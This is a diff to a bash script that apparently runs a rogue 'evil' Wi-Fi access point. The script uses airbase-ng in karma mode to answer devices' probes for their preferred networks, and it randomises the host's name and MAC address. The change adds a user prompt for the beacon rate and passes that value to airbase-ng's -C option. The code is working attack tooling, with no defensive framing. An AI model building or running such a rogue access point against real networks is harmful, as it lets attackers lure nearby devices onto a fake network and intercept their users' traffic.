@@ -99,6 +99,24 @@ f_channel(){
   esac
 }
 
+f_beacon_rate(){
+  clear
+
+  echo
+  echo "[+] Enter the beacon rate at which to broadcast probe requests:"
+  echo
+  echo "[+] NOTE: If clients don't stay connected try changing this value"
+  echo
+  echo "[+] Default is: [30]"
+  echo
+  read -p "Range (20-70): " brate
+  echo
+
+  if [ -z $brate ]; then
+    brate=30
+  fi
+}
+
 f_preplaunch(){
   #Change the hostname and mac address randomly
 
@@ -129,7 +147,7 @@ f_evilap(){
   echo "[+] Creating new logfile: $logname"
 
   #Start Airbase-ng with -P for preferred networks
-  airbase-ng -P -C 70 -c $channel -e "$ssid" -v mon0 > $logname 2>&1 &
+  airbase-ng -P -C $brate -c $channel -e "$ssid" -v mon0 > $logname 2>&1 &
   sleep 2
 
   #Bring up virtual interface at0
@@ -184,6 +202,11 @@ f_karmaornot(){
     [1-2]*) ;;
     *) f_karmaornot ;;
   esac
+
+  if [ $karma -eq 1 ]; then
+    f_beacon_rate
+  fi
+
 }
 
 f_identify_device
